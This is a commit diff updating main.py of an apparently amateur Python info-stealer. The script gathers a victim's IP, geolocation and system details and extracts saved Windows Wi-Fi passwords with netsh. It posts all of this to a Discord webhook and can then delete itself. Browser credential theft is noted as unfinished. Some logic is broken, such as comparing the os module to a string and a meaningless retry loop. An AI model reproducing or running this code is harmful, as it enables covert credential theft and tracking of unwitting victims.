Update main.py
fixed not set variables

+++ main.py
@@ -1,5 +1,7 @@
 import requests
 import os
+import re
+import sys
 import datetime
 import platform
 import socket
@@ -8,41 +10,68 @@ import subprocess
 
 from datetime import date
 
-#FINISHED
-#log ip 
-raw_format = requests.get('https://api.duckduckgo.com/?q=ip&format=json')
-grabbed_ip = raw_format.json()["Answer"].split()[4]
+#customization of behavior
+ip_log = True
+general_log = True
+self_destruct = False
+retry_request =  True
 
 #FINISHED
 #log location and other info
-req = requests.get("https://ipinfo.io/json")
-data = req.json()
-ip = data.get('ip')
-city = data.get('city')
-country = data.get('country')
-region = data.get('region')
-org = data.get('org')
-loc = data.get('loc')
-googlemap = "https://www.google.com/maps/search/google+map++" + loc
+if ip_log == True:
+    req = requests.get("https://ipinfo.io/json")
+    data = req.json()
+    ip = data.get('ip')
+    city = data.get('city')
+    country = data.get('country')
+    region = data.get('region')
+    org = data.get('org')
+    loc = data.get('loc')
+    googlemap = "https://www.google.com/maps/search/google+map++" + loc
+else:
+    ip = ("Set: False")
+    city = ("Set: False")
+    country = ("Set: False")
+    region = ("Set: False")
+    org = ("Set: False")
+    loc = ("Set: False")
+    googlemap = ("Set: False")
 
 #FINISHED, maybe add more stuff later
 #general info
-machine1 = platform.machine()
-version1 = platform.version()
-platform1 = platform.platform()
-uname1 = platform.uname()
-network_name = platform.node()
-python = platform.python_build()
-system1 = platform.system()
-process1 = platform.processor()
-computername = socket.gethostname()
-localipaddress = socket.gethostbyname(computername)
-date_of_extraction = date.today()
+
+if general_log == True: 
+    machine1 = platform.machine()
+    version1 = platform.version()
+    platform1 = platform.platform()
+    uname1 = platform.uname()
+    network_name = platform.node()
+    python = platform.python_build()
+    system1 = platform.system()
+    process1 = platform.processor()
+    computername = socket.gethostname()
+    localipaddress = socket.gethostbyname(computername)
+    date_of_extraction = date.today()
+else:
+    machine1 = ("set: False")
+    version1 = ("set: False")
+    platform1 = ("set: False")
+    uname1 = ("set: False")
+    network_name = ("set: False")
+    python = ("set: False")
+    system1 = ("set: False")
+    process1 = ("set: False")
+    computername = ("set: False")
+    localipaddress = ("set: False")
+    date_of_extraction = ("set: False")
+    pass
+
 
 #extract browser creds
 #finish later
 
 #extracting wifi passwords
+#FINISHED just debug
 if os != ("nt"):
     b = ('Unable to get wifi')
     pass
@@ -54,13 +83,10 @@ else:
             results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
             results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
 
-#else:
-#    pass
-
 #FINISHED
 #the discord part
 
-url='WEBHOOK'
+url='URL HERE'
 
 data_to_discord = {
 }
@@ -76,6 +102,7 @@ data_to_discord["embeds"] = [
                         {
                             'name': 'PC informations ',
                             'value': f'''
+
                             Version - {version1}
                             Platform - {platform1}
                             Username - {uname1}
@@ -91,8 +118,8 @@ data_to_discord["embeds"] = [
                         {
                             'name': 'Network informations ',
                             'value': f'''
-                            IP - {grabbed_ip}
-                            IP check - {ip}
+
+                            IP - {ip}
                             Local - {localipaddress}
                             
 
@@ -101,6 +128,7 @@ data_to_discord["embeds"] = [
                         {
                             'name': 'Location ',
                             'value': f'''
+
                             City - {city}
                             Country - {country}
                             Region - {region}
@@ -109,10 +137,10 @@ data_to_discord["embeds"] = [
                             {googlemap}
                             ''',
                         },
-                        { 
+                        {  #i need to add some sort of function to ignore wifi variable when on linux, but i am too dumb to do that :D
                             'name': "Credentials",
                             'value':f''' 
-                             {b}
+                            {b}
 
                             ''',
                         }
@@ -122,17 +150,29 @@ data_to_discord["embeds"] = [
                     }
             }
 ]
+
 result = requests.post(url, json = data_to_discord)
 
-request_for_retry = (requests.post(url, json = data_to_discord))
-if result.status_code ==200:
-    for x in request_for_retry:
-        request_for_retry 
-else:
+if retry_request == True:
+    request_for_retry = (requests.post(url, json = data_to_discord))
+    if result.status_code ==200:
+        for x in request_for_retry:
+            request_for_retry 
+    else:
+        pass
+else: 
     pass
+    
 
 #SELF-DESTRUCT
-full_path = os.path.realpath(__file__)
-path, filename = os.path.split(full_path)
+if self_destruct == True:
+    full_path = os.path.realpath(__file__)
+    path, filename = os.path.split(full_path)
+    os.remove(path + '/' + filename)
+else: 
+    pass
 
-os.remove(path + '/' + filename)
+
+
+    
+
